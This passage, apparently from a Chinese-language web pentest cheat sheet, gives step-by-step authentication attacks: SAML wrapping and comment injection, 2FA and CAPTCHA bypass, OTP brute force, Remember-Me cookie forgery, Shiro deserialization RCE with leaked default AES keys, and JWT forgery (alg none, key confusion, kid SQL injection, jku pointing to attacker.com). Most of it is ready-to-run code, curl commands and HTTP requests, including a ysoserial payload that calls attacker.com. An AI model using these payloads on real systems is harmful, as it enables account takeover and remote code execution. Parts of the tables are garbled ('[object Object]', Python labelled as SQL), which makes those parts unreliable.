# 在NameID中注入: admin@target.com<!---->.evil.com
```

SAML签名绕过的多种高级技术

| 片段 | 说明 | 类型 |
|---|---|---|
| `XSW` | XML Signature Wrapping，移动已签名节点位置并注入恶意节点 | value |
| `xmlsec1 --sign` | 使用自签名证书重新签名SAML断言 | command |
| `Comment注入` | 利用XML注释截断NameID值 | value |

> platform: `linux`

**WAF 绕过**

#### SAML XML混淆绕过WAF

```
# 1. XML编码混淆:
# 使用CDATA段包裹payload:
<NameID><![CDATA[admin@target.com]]></NameID>

# 2. DTD定义实体:
<!DOCTYPE foo [<!ENTITY user "admin@target.com">]>
<NameID>&user;</NameID>

# 3. XML命名空间混淆:
<saml:NameID xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
             xmlns:x="http://evil.com">admin@target.com</saml:NameID>

# 4. 编码SAMLResponse的不同方式:
# 标准Base64:
cat saml.xml | base64 -w0
# 带换行的Base64:
cat saml.xml | base64
# URL编码后的Base64:
cat saml.xml | base64 -w0 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))"

# 5. Deflate+Base64(某些实现接受):
python3 -c "import zlib,base64; print(base64.b64encode(zlib.compress(open('saml.xml','rb').read())).decode())"
```

XML编码混淆和多种格式变体绕过WAF对SAML的检测

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 1. XML编码混淆: # 使用CDATA段包裹payload: <NameID><![CDATA[admin@ta` | XML内容 | value |
| `<!DOCTYPE foo [<!ENTITY user "admin@target.com">` | XML声明/实体定义 | tag |
| `]> <NameID>&user;</NameID>  # 3. XML命名空间混淆: <saml:NameID xml` | XML内容 | value |

> platform: `linux`

**教程**

[object Object]

---

### 7. 2FA绕过

- **id:** `auth-2fa`
- **分类:** 认证漏洞 / 2FA
- **tags:** `auth` `2fa` `mfa`

绕过双因素认证

**前置条件**

- 开启2FA

**利用步骤**

#### 直接访问

```
# 2FA绕过 - 强制浏览(直接跳过验证步骤):
# 1. 正常登录输入用户名密码，到达2FA验证页面
# 2. 不输入验证码，直接访问后台页面:
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/admin/dashboard" -v
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/api/user/profile" -v
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/home" -v

# 3. 修改前端JS跳过验证:
# 在浏览器Console中执行:
# window.location = '/dashboard'

# 4. 修改响应中的验证状态:
# Burp拦截响应: {"2fa_required":true} → {"2fa_required":false}

# 5. 直接调用API(可能不检查2FA状态):
curl -b "session=COOKIE" "http://target.com/api/v1/users" -v
```

强制浏览绕过2FA页面

| 片段 | 说明 | 类型 |
|---|---|---|
| `URL` | 受保护页面 | path |

#### 验证码爆破

```
# 2FA验证码爆破:
# 1. TOTP通常为6位数字(000000-999999):
# 但有30秒时间窗口，需要极快速爆破

# 2. 短信验证码爆破(4位):
# Burp Intruder:
POST /verify-2fa HTTP/1.1
Content-Type: application/json

{"otp":"§0000§","session":"LOGIN_SESSION"}
# Payload: Numbers 0000-9999

# 3. 检测速率限制:
# 快速发送10次请求，观察是否被限制
for i in $(seq 1000 1010); do
  curl -s -o /dev/null -w "%{http_code}" \
    -d "otp=$i&session=SESS" "http://target.com/verify-2fa"
  echo " - $i"
done

# 4. 绕过速率限制:
# X-Forwarded-For IP轮换
# 修改User-Agent
# 添加空字节: otp=1234%00
```

无速率限制

| 片段 | 说明 | 类型 |
|---|---|---|
| `OTP` | 一次性密码 | parameter |

#### 逻辑绕过

```
response=true / success=1
```

修改响应包

| 片段 | 说明 | 类型 |
|---|---|---|
| `response` | API响应字段 | json |

**WAF 绕过**

#### 响应篡改与直接端点访问

```
# 响应篡改(Burp拦截):
# 原始响应: {"success":false,"message":"Invalid OTP"}
# 修改为:   {"success":true,"message":"Valid OTP"}

# 直接跳过2FA步骤:
# 登录后不访问/verify-2fa，直接访问:
GET /dashboard HTTP/1.1
Cookie: session=AFTER_LOGIN_SESSION

# 修改状态参数:
POST /verify-2fa
{"otp":"000000","skip":true}
/verify-2fa?verified=true
```

通过拦截并修改2FA验证响应包欺骗前端认为验证通过，或绕过2FA页面直接访问受保护端点测试服务端是否强制校验2FA状态

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 响应篡改(Burp拦截):` | 主要命令 | command |
| `...` | 共11行 | value |

#### 备份码爆破与验证竞态条件

```
# 备份码爆破(通常为8位数字/字母):
# 使用Burp Intruder对backup_code参数进行爆破
POST /verify-backup-code
{"backup_code":"§12345678§"}
# 检查速率限制和锁定策略

# 竞态条件(Race Condition):
# 同时发送多个验证请求:
for i in $(seq 000000 000100); do
  curl -s -X POST "http://target.com/verify-2fa"     -b "session=SID" -d "otp=$i" &
done
wait
# 多线程并发可能绕过速率限制
```

对2FA备份恢复码进行字典爆破(通常限制不如OTP严格)，利用竞态条件并发发送多个OTP验证请求绕过速率限制

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 备份码爆破(通常为8位数字/字母):` | 主要命令 | command |
| `...` | 共13行 | value |

**教程**

[object Object]

---

### 8. 验证码绕过

- **id:** `auth-captcha`
- **分类:** 认证漏洞 / 验证码
- **tags:** `auth` `captcha` `bypass`

绕过图形验证码

**前置条件**

- 存在验证码

**利用步骤**

#### 重复使用

```
# 验证码重放攻击(一次验证,多次使用):
# 1. 正常获取并输入正确验证码
# 2. 在Burp中抓取成功的请求
# 3. 将请求发送到Repeater，重复发送:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=§test§&captcha=VALID_CAPTCHA

# 4. 如果每次响应都正常(非"验证码错误")
#    说明验证码未一次性失效，可用于暴力破解

# 5. 配合Intruder进行密码爆破:
# Positions: password字段
# Payloads: 密码字典
# 固定captcha字段为已知有效值

# Burp Intruder设置: Sniper模式，Payload为密码列表
```

验证码未一次性失效

| 片段 | 说明 | 类型 |
|---|---|---|
| `captcha` | 验证码参数 | parameter |

#### 空值绕过

```
# 验证码空值/参数删除绕过:
# 1. 提交空验证码:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test&captcha=

# 2. 提交null值:
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test","captcha":null}

# 3. 完全删除captcha参数:
POST /login HTTP/1.1

username=admin&password=test

# 4. 提交特殊值:
captcha=0
captcha=undefined
captcha[]=
captcha=true

# 5. 不同编码:
captcha=%00
captcha=%20

# 如果任一方式登录成功，说明验证码验证可被绕过
```

验证码参数留空

| 片段 | 说明 | 类型 |
|---|---|---|
| `empty` | 空值 | value |

#### 删除参数

```
# 验证码参数移除绕过:
# 1. 原始请求(带验证码):
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test&captcha=abcd

# 2. 在Burp Repeater中删除captcha参数:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test

# 3. 修改Content-Type测试(可能走不同处理逻辑):
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test"}

# 4. 通过移动端API(可能无验证码):
POST /api/mobile/login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test"}

# 5. 旧版本API(可能无验证码):
POST /api/v1/login HTTP/1.1
```

后端未检查参数存在性

| 片段 | 说明 | 类型 |
|---|---|---|
| `remove` | 移除参数 | technique |

**WAF 绕过**

#### 会话复用与参数移除绕过

```
# 会话复用(验证码未一次性失效):
# 1. 正确输入验证码一次
# 2. 后续请求继续使用相同captcha值
# Burp Repeater重放同一captcha参数

# 删除captcha参数:
# 原始: user=admin&pass=123&captcha=ABCD
# 修改: user=admin&pass=123
# 后端可能不校验缺失的参数

# 空值绕过:
captcha=
captcha=null
captcha=undefined
captcha[]=
```

测试验证码是否在使用后立即失效(可重复使用)，删除captcha参数检查后端是否强制校验，或传入空值、数组等异常类型绕过类型检查

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 会话复用(验证码未一次性失效):` | 主要命令 | command |
| `...` | 共13行 | value |

#### OCR识别与音频验证码利用

```
# OCR自动识别图形验证码:
# Python + Tesseract:
import pytesseract
from PIL import Image
img = Image.open("captcha.png")
text = pytesseract.image_to_string(img)
print(text)

# 音频验证码利用:
# 使用Google Speech-to-Text API识别音频验证码
# 或使用Selenium自动获取+语音识别

# 验证码响应泄露:
# 检查响应头、Cookie、隐藏字段中是否包含验证码值
curl -v "http://target.com/captcha/generate" 2>&1 | grep -iE "captcha|code|verify"
```

使用OCR工具(Tesseract)自动识别简单图形验证码，利用音频验证码的语音识别替代方案，或检查响应中是否直接泄露验证码值

| 片段 | 说明 | 类型 |
|---|---|---|
| `# OCR自动识别图形验证码: # Python + Tesseract: import pytesseract ` | SQL表达式 | value |
| `from` | SQL关键字 | keyword |
| ` PIL import Image img = Image.open("captcha.png") text = pytesseract.image_to_string(img) print(text)  # 音频验证码利用: # 使用Google Speech-to-Text API识别音频验证码 # 或使用Selenium自动获取+语音识别  # 验证码响应泄露: # 检查响应头、Cookie、隐藏字段中是否包含验证码值 curl -v "http://target.com/captcha/generate" 2>&1 | grep -iE "captcha|code|verify"` | SQL表达式 | value |

**教程**

[object Object]

---

### 9. 记住我漏洞

- **id:** `auth-remember-me`
- **分类:** 认证漏洞 / 会话管理
- **tags:** `auth` `remember-me` `cookie`

Remember Me功能漏洞

**前置条件**

- 开启Remember Me

**利用步骤**

#### Cookie伪造

```
# Remember-Me Cookie伪造:
# 1. 分析Cookie结构:
# 常见格式: username|timestamp|hash 或 base64(username:expiry:hash)
Cookie: remember=admin
Cookie: remember=dXNlcjoxNjk5MDAwMDAwOmFiY2QxMjM0

# 2. Base64解码分析:
echo "dXNlcjoxNjk5MDAwMDAwOmFiY2QxMjM0" | base64 -d
# 输出: user:1699000000:abcd1234

# 3. 伪造admin的Cookie:
echo -n "admin:1999999999:abcd1234" | base64
# 用生成的值替换Cookie

# 4. 如果使用弱Hash(如MD5(username+secret)):
# 注册新账号 → 分析Cookie → 推导secret → 伪造admin Cookie

# 5. 测试:
curl -b "remember=FORGED_VALUE" "http://target.com/dashboard" -v
```

明文存储用户名

| 片段 | 说明 | 类型 |
|---|---|---|
| `remember` | Remember Me Cookie | header |

#### Base64解码

```
# Remember-Me Cookie解码与分析:
# 1. 提取Cookie值:
curl -c cookies.txt -d "username=testuser&password=test123&remember=1" "http://target.com/login"
cat cookies.txt | grep -i remember

# 2. Base64解码:
echo "COOKIE_VALUE" | base64 -d

# 3. 如果是URL编码+Base64:
python3 -c "import urllib.parse,base64; print(base64.b64decode(urllib.parse.unquote('COOKIE_VALUE')))"

# 4. 尝试Hex解码:
echo "COOKIE_VALUE" | xxd -r -p

# 5. 分析解码后的结构:
# username:timestamp:hmac
# {"user":"admin","exp":1699999999}
# 序列化对象(Java/PHP)

# 6. 检查是否为已知框架的Cookie格式:
# Shiro: AES-CBC加密(默认密钥kPH+bIxk5D2deZiIxcaaaA==)
# Django: base64(payload):timestamp:signature
```

弱加密或编码

| 片段 | 说明 | 类型 |
|---|---|---|
| `Base64` | 常见编码方式 | encoding |

#### 记住密码Token逆向分析

```
# 1. 收集多个remember-me Token:
for i in $(seq 1 5); do
  token=$(curl -s -c - -d "username=testuser&password=testpass&remember=1"     "http://target.com/login" | grep -i "remember" | awk '{print $NF}')
  echo "Token $i: $token"
  sleep 1
done

# 2. Base64解码分析:
echo "REMEMBER_TOKEN" | base64 -d | xxd | head -20

# 3. 检查常见格式:
# username:timestamp:hash
# username:md5(password)
# serialized_object(Java: rO0AB... PHP: O:4:...)

# 4. 如果是Java序列化(Shiro RememberMe):
echo "REMEMBER_TOKEN" | base64 -d | xxd | head -3
# 如果以 aced0005 开头 → Java序列化对象
# 如果Token加密: 尝试Shiro默认密钥 kPH+bIxk5D2deZiIxcaaaA==

# 5. PHP反序列化检查:
echo "REMEMBER_TOKEN" | base64 -d
# 如果形如 O:4:"User":2:{s:4:"name";s:5:"admin";...} → PHP序列化
```

逆向分析remember-me Token的生成逻辑

| 片段 | 说明 | 类型 |
|---|---|---|
| `base64 -d | xxd` | 解码Token并以十六进制查看结构 | command |
| `aced0005` | Java序列化魔术字节，表示是Java对象 | value |
| `kPH+bIxk5D2deZiIxcaaaA==` | Apache Shiro框架的默认AES密钥 | value |

> platform: `linux`

#### Shiro RememberMe反序列化RCE

```
# Apache Shiro框架的RememberMe Cookie反序列化漏洞
# 原理: AES-CBC加密(默认密钥) → Base64编码 → Cookie

# 1. 检测Shiro框架:
curl -sI "http://target.com/" | grep -i "rememberMe=deleteMe"
# 发送无效Cookie触发特征响应:
curl -sI "http://target.com/" -b "rememberMe=test" | grep -i "rememberMe"

# 2. 已知Shiro密钥列表测试:
# kPH+bIxk5D2deZiIxcaaaA==
# 2AvVhdsgUs0FSA3SDFAdag==
# 3AvVhmFLUs0KTA3Kprsdag==
# ...

# 3. 使用ShiroExploit工具:
# java -jar ShiroExploit.jar http://target.com

# 4. 手动构造payload(需要ysoserial):
java -jar ysoserial.jar CommonsCollections2 "curl http://attacker.com/rce" > payload.ser

# AES加密:
python3 -c "
import base64
from Crypto.Cipher import AES
import os

key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==')
iv = os.urandom(16)
payload = open('payload.ser','rb').read()
# PKCS5Padding
pad = 16 - len(payload) % 16
payload += bytes([pad]) * pad
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = iv + cipher.encrypt(payload)
print(base64.b64encode(encrypted).decode())
"
```

利用Shiro默认密钥 + 反序列化链实现RCE

| 片段 | 说明 | 类型 |
|---|---|---|
| `ysoserial` | Java反序列化payload生成工具 | command |
| `CommonsCollections2` | 常用的反序列化利用链(Gadget Chain) | value |
| `AES-CBC + PKCS5Padding` | Shiro使用的加密方式 | value |

**WAF 绕过**

#### Remember-Me Cookie绕过检测

```
# 1. 修改Cookie名称大小写:
curl -b "RememberMe=payload" "http://target.com/"
curl -b "rememberme=payload" "http://target.com/"
curl -b "REMEMBERME=payload" "http://target.com/"

# 2. Shiro密钥枚举(使用不同密钥加密payload):
import base64, itertools
from Crypto.Cipher import AES
import os

keys = [
    "kPH+bIxk5D2deZiIxcaaaA==",
    "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==",
    "4AvVhmFLUs0KTA3Kprsdag==",
    "Z3VucwAAAAAAAAAAAAAAAA==",
    "wGiHplamyXlVB11UXWol8g==",
    "fCq+/xW488hMTCD+cmJ3aQ==",
]

payload = open("payload.ser", "rb").read()
for k in keys:
    try:
        key = base64.b64decode(k)
        iv = os.urandom(16)
        pad = 16 - len(payload) % 16
        padded = payload + bytes([pad]) * pad
        cipher = AES.new(key, AES.MODE_CBC, iv)
        enc = base64.b64encode(iv + cipher.encrypt(padded)).decode()
        print(f"Key: {k} → Cookie length: {len(enc)}")
    except Exception as e:
        print(f"Key: {k} → Error: {e}")

# 3. GCM模式(Shiro 1.4.2+):
# 新版Shiro使用AES-GCM，需要对应的加密方式
```

枚举Shiro密钥和不同加密模式绕过检测

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 1. 修改Cookie名称大小写: curl -b "RememberMe=payload" "http://target.com/" curl -b "rememberme=payload" "http://target.com/" curl -b "REMEMBERME=payload" "http://target.com/"  # 2. Shiro密钥枚举(使用不同密钥加密payload): import base64, itertools ` | SQL表达式 | value |
| `from` | SQL关键字 | keyword |
| ` Crypto.Cipher import AES import os  keys = [     "kPH+bIxk5D2deZiIxcaaaA==",     "2AvVhdsgUs0FSA3SDFAdag==",     "3AvVhmFLUs0KTA3Kprsdag==",     "4AvVhmFLUs0KTA3Kprsdag==",     "Z3VucwAAAAAAAAAAAAAAAA==",     "wGiHplamyXlVB11UXWol8g==",     "fCq+/xW488hMTCD+cmJ3aQ==", ]  payload = open("payload.ser", "rb").read() for k in keys:     try:         key = base64.b64decode(k)         iv = os.urandom(16)         pad = 16 - len(payload) % 16         padded = payload + bytes([pad]) * pad         cipher = AES.new(key, AES.MODE_CBC, iv)         enc = base64.b64encode(iv + cipher.encrypt(padded)).decode()         print(f"Key: {k} → Cookie length: {len(enc)}")     except Exception as e:         print(f"Key: {k} → Error: {e}")  # 3. GCM模式(Shiro 1.4.2+): # 新版Shiro使用AES-GCM，需要对应的加密方式` | SQL表达式 | value |

**教程**

[object Object]

---

### 10. JWT认证漏洞

- **id:** `auth-jwt`
- **分类:** 认证漏洞 / JWT
- **tags:** `auth` `jwt` `token`

利用JWT(JSON Web Token)实现缺陷伪造或篡改认证令牌，实现未授权访问或权限提升

**前置条件**

- 目标使用JWT进行认证
- 可以获取或拦截JWT令牌
- JWT库存在已知漏洞或服务端配置不当

**利用步骤**

#### JWT解码与分析

```
# 手动解码JWT (Base64)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | cut -d. -f2 | base64 -d 2>/dev/null

# 使用jwt_tool解码:
python3 jwt_tool.py <token>

# 在线解码:
# https://jwt.io/

# 检查关键字段:
# - alg: 签名算法(HS256/RS256/none)
# - kid: 密钥ID(可能可注入)
# - typ: 令牌类型
# - exp: 过期时间
# - role/admin/isAdmin: 权限字段
```

解码JWT的Header和Payload分析其结构和权限信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `cut -d. -f2` | 以点号分割JWT取第二段(Payload) | command |
| `base64 -d` | Base64解码JWT段落 | command |
| `alg` | JWT头部的算法字段，常见攻击点 | value |
| `kid` | Key ID字段，可能存在SQL注入或路径遍历 | value |

#### Algorithm None攻击

```
# 将alg改为none绕过签名验证
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin", "iat": 1700000000, "exp": 1999999999}

h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=")

# 多种变体绕过:
alg_variants = ["none", "None", "NONE", "nOnE"]
for alg in alg_variants:
    header["alg"] = alg
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
    token = h.decode() + "." + p.decode() + "."
    print(f"alg={alg}: {token}")

# 使用jwt_tool:
python3 jwt_tool.py <token> -X a  # Algorithm None attack
```

将JWT的alg字段设为none，使服务端跳过签名验证，直接接受篡改的payload

| 片段 | 说明 | 类型 |
|---|---|---|
| `alg: "none"` | 将算法设为none，服务端可能跳过签名校验 | value |
| `rstrip(b"=")` | 移除Base64 padding(JWT标准要求) | command |
| `-X a` | jwt_tool的Algorithm None自动攻击模式 | parameter |

#### HS256密钥爆破

```
# 使用jwt_tool爆破弱密钥
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# 使用hashcat:
hashcat -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt

# 使用john:
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# 常见弱密钥:
# secret, password, 123456, admin, key, test
# 公司名, 项目名, 域名等

# 密钥确认后伪造JWT:
import jwt
token = jwt.encode({"user":"admin","role":"admin"}, "found_secret", algorithm="HS256")
print(token)
```

对使用HS256对称加密的JWT进行密钥字典爆破

| 片段 | 说明 | 类型 |
|---|---|---|
| `-C` | jwt_tool的密钥爆破模式(Crack) | parameter |
| `-d` | 指定字典文件路径 | parameter |
| `-m 16500` | hashcat中JWT的哈希模式编号 | value |
| `jwt.encode()` | 使用破解的密钥伪造新JWT | command |

> platform: `linux`

#### RS256→HS256算法混淆攻击

```
# 当服务端使用RS256但接受HS256时:
# 1. 获取服务端公钥(通常在/.well-known/jwks.json或/api/keys)
curl -s "http://target.com/.well-known/jwks.json"
curl -s "http://target.com/api/v1/keys"

# 2. 提取公钥
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > pubkey.pem

# 3. 用公钥作为HS256的密钥签名JWT
import jwt
public_key = open("pubkey.pem").read()
token = jwt.encode(
    {"user": "admin", "role": "admin"},
    public_key,
    algorithm="HS256"
)
print(token)

# 使用jwt_tool:
python3 jwt_tool.py <token> -X k -pk pubkey.pem  # Key confusion attack
```

利用RS256/HS256算法混淆，用公钥作为HS256对称密钥签名伪造JWT

| 片段 | 说明 | 类型 |
|---|---|---|
| `/.well-known/jwks.json` | JWT密钥集合的标准端点 | value |
| `openssl x509 -pubkey` | 从证书中提取公钥 | command |
| `-X k` | jwt_tool的密钥混淆攻击模式 | parameter |
| `-pk pubkey.pem` | 指定公钥文件用于算法混淆 | parameter |

> platform: `linux`

#### KID参数注入

```
# KID (Key ID) SQL注入:
# 原始header: {"alg":"HS256","kid":"key1"}
# 注入header: {"alg":"HS256","kid":"key1' UNION SELECT 'ATTACKER_SECRET' -- "}

import jwt, json, base64

# SQL注入方式:
header = {"alg": "HS256", "kid": "x' UNION SELECT 'test' -- "}
token = jwt.encode({"user": "admin"}, "test", algorithm="HS256", headers=header)

# 路径遍历方式:
header2 = {"alg": "HS256", "kid": "../../dev/null"}
# /dev/null内容为空，密钥为空字符串
token2 = jwt.encode({"user": "admin"}, "", algorithm="HS256", headers=header2)

# 使用jwt_tool:
python3 jwt_tool.py <token> -X i -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

利用JWT头部kid字段的SQL注入或路径遍历控制签名验证密钥

| 片段 | 说明 | 类型 |
|---|---|---|
| `kid` | JWT头部字段，指定服务端使用哪个密钥验证签名 | value |
| `UNION SELECT` | SQL注入控制kid查询返回攻击者指定的密钥值 | command |
| `../../dev/null` | 路径遍历到空文件，使密钥为空字符串 | value |
| `-X i` | jwt_tool的注入攻击模式 | parameter |

**WAF 绕过**

#### JWK/JKU头部密钥注入

```
# JWK内嵌密钥注入:
# 生成RSA密钥对:
openssl genrsa -out attacker.key 2048
openssl rsa -in attacker.key -pubout -out attacker.pub

# 构造JWT Header:
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"<attacker_n_base64>","e":"AQAB","use":"sig"}}
# 用attacker.key签名，服务端从jwk字段取公钥验证

# JKU远程密钥注入:
{"alg":"RS256","jku":"http://attacker.com/jwks.json"}
# 在attacker.com上部署包含攻击者公钥的JWKS文件

# 使用jwt_tool:
python3 jwt_tool.py <token> -X s -pr attacker.key
```

通过JWT Header中的jwk字段内嵌攻击者公钥或jku字段指向攻击者的JWKS端点，使服务端使用攻击者控制的密钥验证签名

| 片段 | 说明 | 类型 |
|---|---|---|
| `# JWK内嵌密钥注入:` | 主要命令 | command |
| `...` | 共12行 | value |

#### 算法降级与嵌套令牌利用

```
# 算法降级(RS256→HS256):
# 获取服务端公钥后用作HS256密钥:
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > pub.pem
python3 -c "
import jwt
pub = open('pub.pem').read()
token = jwt.encode({'user':'admin','role':'admin'}, pub, algorithm='HS256')
print(token)"

# Claim篡改+嵌套JWT:
# 在JWT payload中嵌入另一个JWT:
{"user":"admin","inner_token":"<另一个伪造的JWT>"}
# 某些系统会递归解析inner_token
```

利用RS256到HS256的算法混淆攻击(用公钥作对称密钥签名)，或在JWT Payload中嵌入伪造的内部JWT令牌触发递归解析漏洞

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 算法降级(RS256→HS256):` | 主要命令 | command |
| `...` | 共12行 | value |

**教程**

[object Object]
